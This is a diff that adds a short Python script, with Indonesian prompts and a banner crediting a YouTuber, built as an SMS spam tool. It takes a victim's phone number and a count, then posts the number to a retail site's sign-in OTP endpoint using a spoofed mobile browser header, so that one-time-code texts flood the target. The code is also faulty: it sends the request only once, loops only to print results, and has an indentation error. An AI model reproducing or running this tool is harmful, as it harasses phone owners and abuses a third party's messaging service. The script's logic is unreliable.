@@ -1,0 +1,45 @@
+import os, sys, time, requests
+from requests import post
+
+def lagi():
+        l = input('Mau Spam Lagi? [y/n]: ')
+        if l == 'y':
+                main()
+        elif l == 'n':
+                sys.exit()
+
+def main():
+        os.system('clear')
+        os.system('figlet Spam Sms')
+        banner = '''
+>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[☆] author  : elis
+[☆] youtube : andiElis  official
+[☆] channel : subscribe
+>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+'''
+        print(banner)
+         no = input('Target : ')
+        jml = int(input('Jumlah Spam : '))
+
+        ua = {
+        'Connection' : 'keep-alive',
+        'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Mobile Safari/537.36',
+        'Referer': 'https://www.mapclub.com/en/user/signup',
+        }
+
+        dat = {
+        'phone': no,
+        }
+
+        sendSms = requests.post('https://cmsapi.mapclub.com/api/signin-otp', data=dat, headers=ua)
+
+        for x in range(jml):
+
+                if 'error' in sendSms.text:
+                         print('Spam Sms '+ no + '[ Gagal ]')
+                else: 
+                         print('Spam Sms '+ no + '[ Success ]')
+
+main()
+lagi() 
